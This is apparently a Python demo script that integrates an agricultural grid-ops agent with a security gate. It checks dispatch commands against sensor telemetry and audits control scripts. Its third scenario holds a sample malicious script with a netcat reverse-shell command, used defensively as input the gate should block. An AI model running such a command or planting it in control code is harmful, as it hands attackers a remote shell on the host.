"""
Example 5: Ready-to-use Integration Suite for 'agrid-ops-agent'
Demonstrates:
1. $50 USDC Pre-funded Vault initialization (25,000 ops runway, zero-latency M2M).
2. Telemetry-grounded dispatch verification (Preventing actuator hallucinations).
3. Dangerous AST/hardware override injection blocking.
4. EIP-712 cryptographic proof-of-safety generation for smart grid on-chain execution.
5. High-throughput telemetry batch audits.
"""

import sys
import os
import time

# Ensure UTF-8 console output
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from sdk.agent_gate_sdk import SecurityGateClient, SecurityGateBlockedError, gate_inspect

# Live Cloud Run Production Endpoint
LIVE_GATE_URL = os.getenv("GATE_URL", "https://agent-security-gate-x402-212942243360.asia-northeast3.run.app")

class AgridOpsAgentGuard:
    """Specialized Security & Hallucination Guardrail for Agrid-Ops-Agent."""

    def __init__(self, agent_wallet: str = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"):
        self.agent_wallet = agent_wallet
        # Initialize Security Gate Client
        self.client = SecurityGateClient(
            gate_url=LIVE_GATE_URL,
            client_address=agent_wallet,
            vault_key="vault_key_security_demo_agent_2026" # Sandbox/Pre-funded key
        )
        print(f"⚡ [AgridOpsGuard] Initialized guardrail connected to {LIVE_GATE_URL}")

    def verify_grid_dispatch(self, dispatch_command: str, sensor_ground_truth: str) -> dict:
        """
        Verifies that an autonomous grid/irrigation dispatch command is factually grounded
        in real-time sensor telemetry and contains zero prompt breakouts.
        """
        return self.client.inspect(
            agent_output=dispatch_command,
            context_ground_truth=sensor_ground_truth,
            is_code=False,
            raise_on_block=True
        )

    def audit_actuator_script(self, python_code: str) -> dict:
        """
        Inspects dynamic Python actuator/control scripts for dangerous AST nodes (os.system, sockets, eval).
        """
        return self.client.inspect(
            agent_output=python_code,
            is_code=True,
            raise_on_block=True
        )

    def audit_telemetry_batch(self, zone_telemetries: list) -> dict:
        """
        Executes high-throughput batch audit for multi-zone grid telemetry in a single round-trip.
        """
        items = [
            {
                "agent_output": z["command"],
                "context_ground_truth": z["sensor_data"],
                "is_code": False
            }
            for z in zone_telemetries
        ]
        return self.client.inspect_batch(items)


def run_agrid_ops_integration_demo():
    print("\n" + "="*75)
    print("🌾 [AGRID-OPS-AGENT] Security & Hallucination Gate Integration Suite")
    print("="*75 + "\n")

    guard = AgridOpsAgentGuard()

    # -------------------------------------------------------------
    # 1. Safe Telemetry-Grounded Grid Dispatch Action
    # -------------------------------------------------------------
    print("1️⃣ [Scenario 1: Safe Grounded Actuator Dispatch]")
    sensor_telemetry = "Telemetry Zone-4: Soil Moisture 28.4%, Ambient Temp 29.1C, Power Grid Voltage 240V, Irrigation Schedule 15 minutes."
    agent_action = "Actuator Command: Initiate Zone-4 micro-irrigation at 240V power line for 15 minutes."

    try:
        res = guard.verify_grid_dispatch(agent_action, sensor_telemetry)
        audit = res["audit"]
        attestation = res.get("attestation", {})
        print(f"   ✅ Verdict: {audit['verdict']} (Risk: {audit['risk_score']})")
        print(f"   🔍 NLI Faithfulness: {audit['nli_verification']['is_faithful']}")
        print(f"   🔏 Proof-of-Safety Signature: {attestation.get('signature', '0x...')[:24]}...")
    except SecurityGateBlockedError as e:
        print(f"   ❌ Blocked: {e}")

    # -------------------------------------------------------------
    # 2. Hallucinated Sensor Values (Fake Telemetry Blocker)
    # -------------------------------------------------------------
    print("\n2️⃣ [Scenario 2: Hallucinated Sensor Telemetry Detection]")
    fake_agent_action = "Actuator Command: Zone-4 emergency shutdown due to critical voltage surge to 980V."

    try:
        guard.verify_grid_dispatch(fake_agent_action, sensor_telemetry)
        print("   ❌ Error: Hallucination should have been intercepted!")
    except SecurityGateBlockedError as e:
        print(f"   🛡️ Hallucination Successfully Intercepted & Blocked!")
        print(f"   📋 Threats: {e.audit_report.get('threats')}")
        print(f"   🚫 Fabricated Numbers: {e.audit_report.get('nli_verification', {}).get('fabricated_numbers')}")

    # -------------------------------------------------------------
    # 3. Hazardous Control Script / Code AST Block
    # -------------------------------------------------------------
    print("\n3️⃣ [Scenario 3: Dangerous Actuator Control Script AST Inspection]")
    malicious_script = """
import os
import subprocess

def trigger_irrigation_valve():
    # Attempting host compromise via reverse shell
    os.system("nc -e /bin/bash 192.168.1.100 4444")
"""
    try:
        guard.audit_actuator_script(malicious_script)
        print("   ❌ Error: Hazardous AST should have been blocked!")
    except SecurityGateBlockedError as e:
        print(f"   🚨 Dangerous AST Control Script Blocked!")
        print(f"   🛡️ Detected Threats: {e.audit_report.get('threats')}")

    # -------------------------------------------------------------
    # 4. Multi-Zone High-Throughput Batch Inspection
    # -------------------------------------------------------------
    print("\n4️⃣ [Scenario 4: Multi-Zone High-Throughput Batch Telemetry Audit]")
    multi_zones = [
        {"sensor_data": "Zone-A: Temp 22C, Moisture 45%", "command": "Zone-A valve idle at 45% moisture."},
        {"sensor_data": "Zone-B: Temp 31C, Moisture 18%", "command": "Zone-B trigger emergency water mist at 18%."},
        {"sensor_data": "Zone-C: Temp 25C, Moisture 60%", "command": "Zone-C drainage active at 60%."}
    ]
    t0 = time.perf_counter()
    batch_res = guard.audit_telemetry_batch(multi_zones)
    latency_ms = (time.perf_counter() - t0) * 1000.0

    print(f"   ⚡ Batch Audit Status: {batch_res['status']}")
    print(f"   📊 Total Audited: {batch_res['total_count']} | Passed: {batch_res['passed_count']} | Blocked: {batch_res['blocked_count']}")
    print(f"   ⏱️ Batch Latency: {latency_ms:.2f} ms")

    print("\n" + "="*75)
    print("🎉 AGRID-OPS-AGENT INTEGRATION READINESS VERIFIED (100% SUCCESS)!")
    print("="*75 + "\n")


if __name__ == "__main__":
    run_agrid_ops_integration_demo()
